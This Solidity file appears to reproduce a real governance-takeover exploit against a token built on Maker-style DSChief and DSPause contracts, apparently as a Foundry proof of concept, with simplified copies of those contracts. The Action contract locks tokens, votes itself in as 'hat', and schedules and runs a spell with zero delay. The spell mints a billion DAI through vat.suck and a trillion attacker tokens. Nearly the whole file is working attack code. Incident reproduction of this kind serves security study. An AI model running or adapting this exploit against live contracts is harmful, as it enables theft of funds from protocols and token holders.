pragma solidity ^0.8.24;

import "./Interfaces.sol";
import "forge-std/console.sol";

// Contract used by the attacker to get outstanding CGT balance
// The contract is verified at https://etherscan.io/address/0x1e791527aea32cddbd7ceb7f04612db536816545#code
contract Action {
    IDSChief chief;
    DSPause public pause;
    Spell spell;

    address public pans; // the attacker named the deployer after pans

    // The attacker knew the Chief address in advance, we pass this as a constructor argument
    constructor(address _chief, address _pause) {
        pans = msg.sender;
        // Somehow Chief and Pause in tandem receive minting privileges to CSC Token
        chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
        pause = DSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);

        // chief = IDSChief(_chief);
        // pause = DSPause(_pause);
    }

    modifier onlyPans() {
        require(pans == msg.sender, "not pans");
        _;
    }

    function cook(address _cgt, uint256 amount, uint256 wethMin, uint256 daiMin) external onlyPans {
        IERC20 cgt = IERC20(_cgt);
        cgt.transferFrom(msg.sender, address(this), amount);
        console.log("Balance of CGT: %s", cgt.balanceOf(address(this)));

        cgt.approve(address(chief), amount);

        chief.lock(amount);

        address[] memory _yays = new address[](1);
        _yays[0] = address(this);
        chief.vote(_yays);
        chief.lift(address(this));

        spell = new Spell();
        address spellAddr = address(spell);
        bytes32 tag;
        assembly {
            tag := extcodehash(spellAddr)
        }

        bytes memory funcSig = abi.encodeWithSignature("act(address,address)", address(this), address(cgt));
        uint256 delay = block.timestamp + 0;
        console.log("Balance of CGT: %s", cgt.balanceOf(address(this)));

        // Somehow DSPauseProxy should be allowed in the context of CSC Token to mint tokens
        pause.plot(spellAddr, tag, funcSig, delay);
        pause.exec(spellAddr, tag, funcSig, delay);

        console.log("Balance of CGT: %s", cgt.balanceOf(address(this)));
    }
}

contract Spell {
    function act(address user, IMERC20 cgt) public {
        // TODO
        // IVat vat = IVat(0x0228CBe36e99375F8dd437Eab1CceDC959Be89A3);
        // IJoin daiJoin = IJoin(0xe127C2dBA608Ada7F6d75595ac1b675294df2809);

        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        cgt.mint(user, 10 ** 12 * 1 ether);
    }

    function clean(IMERC20 cgt) external {
        // Anti-mev
        cgt.stop();
    }

    function cleanToo(IMERC20 cgt) external {
        cgt.start();
    }
}

// Chief contract introduced by Maker:
// https://docs.makerdao.com/smart-contract-modules/governance-module/chief-detailed-documentation
// Reference code: https://github.com/dapphub/ds-chief/blob/master/src/chief.sol
contract Chief is IDSChief {
    mapping(bytes32 => address[]) public slates;
    mapping(address => bytes32) public votes;
    mapping(address => uint256) public approvals;
    mapping(address => uint256) public deposits;

    IDSToken public GOV; // voting token that gets locked up
    IDSToken public IOU; // non-voting representation of a token, for e.g. secondary voting mechanisms
    address public hat; // the chieftain's hat

    uint256 public MAX_YAYS;

    event Etch(bytes32 indexed slate);
    // event lock(uint256 amount);

    // IOU constructed outside this contract reduces deployment costs significantly
    // lock/free/vote are quite sensitive to token invariants. Caution is advised.
    constructor(address GOV_, address IOU_, uint256 MAX_YAYS_) public {
        GOV = IDSToken(GOV_);
        IOU = IDSToken(IOU_);
        MAX_YAYS = MAX_YAYS_;
    }

    function lock(uint256 wad) public {
        GOV.pull(msg.sender, wad);
        IOU.mint(msg.sender, wad);
        // deposits[msg.sender] = add(deposits[msg.sender], wad);
        deposits[msg.sender] += wad;
        addWeight(wad, votes[msg.sender]);
    }

    function vote(address[] memory yays) public returns (bytes32) {
        bytes32 slate = etch(yays);
        vote(slate);
        return slate;
    }

    function lift(address whom) public {
        require(approvals[whom] > approvals[hat]);
        hat = whom;
    }

    // Aux functions not called directly
    function etch(address[] memory yays) public returns (bytes32 slate) {
        require(yays.length <= MAX_YAYS);
        requireByteOrderedSet(yays);

        bytes32 hash = keccak256(abi.encodePacked(yays));
        slates[hash] = yays;
        emit Etch(hash);
        return hash;
    }

    function addWeight(uint256 weight, bytes32 slate) internal {
        address[] storage yays = slates[slate];
        for (uint256 i = 0; i < yays.length; i++) {
            approvals[yays[i]] += weight;
        }
    }

    function subWeight(uint256 weight, bytes32 slate) internal {
        address[] storage yays = slates[slate];
        for (uint256 i = 0; i < yays.length; i++) {
            approvals[yays[i]] -= weight;
        }
    }

    function vote(bytes32 slate) public {
        require(
            slates[slate].length > 0
                || slate == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470,
            "ds-chief-invalid-slate"
        );
        uint256 weight = deposits[msg.sender];
        subWeight(weight, votes[msg.sender]);
        votes[msg.sender] = slate;
        addWeight(weight, votes[msg.sender]);
    }

    function requireByteOrderedSet(address[] memory yays) internal pure {
        if (yays.length == 0 || yays.length == 1) {
            return;
        }

        for (uint256 i = 0; i < yays.length - 1; i++) {
            // strict inequality ensures both ordering and uniqueness
            require(uint160(yays[i]) < uint160(yays[i + 1]));
        }
    }
}

contract DSPause {
    uint256 public delay;
    DSPauseProxy public proxy;
    mapping(bytes32 => bool) public plans;

    constructor(uint256 delay_, address owner_, address authority_) public {
        delay = delay_;
        proxy = new DSPauseProxy();
    }

    function hash(address usr, bytes32 tag, bytes memory fax, uint256 eta) internal pure returns (bytes32) {
        return keccak256(abi.encode(usr, tag, fax, eta));
    }

    function plot(address usr, bytes32 tag, bytes memory fax, uint256 eta) public {
        require(eta >= block.timestamp + delay, "ds-pause-delay-not-respected");
        plans[hash(usr, tag, fax, eta)] = true;
    }

    function exec(address usr, bytes32 tag, bytes memory fax, uint256 eta)
        public
        returns (bytes memory out)
    {
        require(plans[hash(usr, tag, fax, eta)], "ds-pause-unplotted-plan");
        require(soul(usr) == tag, "ds-pause-wrong-codehash");
        require(block.timestamp >= eta, "ds-pause-premature-exec");

        plans[hash(usr, tag, fax, eta)] = false;

        out = proxy.exec(usr, fax);
        require(proxy.owner() == address(this), "ds-pause-illegal-storage-change");
    }

    function soul(address usr) internal view returns (bytes32 tag) {
        assembly {
            tag := extcodehash(usr)
        }
    }
}

contract DSPauseProxy {
    address public owner;

    modifier auth() {
        require(msg.sender == owner, "ds-pause-proxy-unauthorized");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function exec(address usr, bytes memory fax) public auth returns (bytes memory out) {
        bool ok;
        (ok, out) = usr.delegatecall(fax);
        require(ok, "ds-pause-delegatecall-error");
    }
}

contract IOUToken {
    event Mint(address to, uint256 amount);

    function mint(address to, uint256 amount) external {
        emit Mint(to, amount);
    }
}
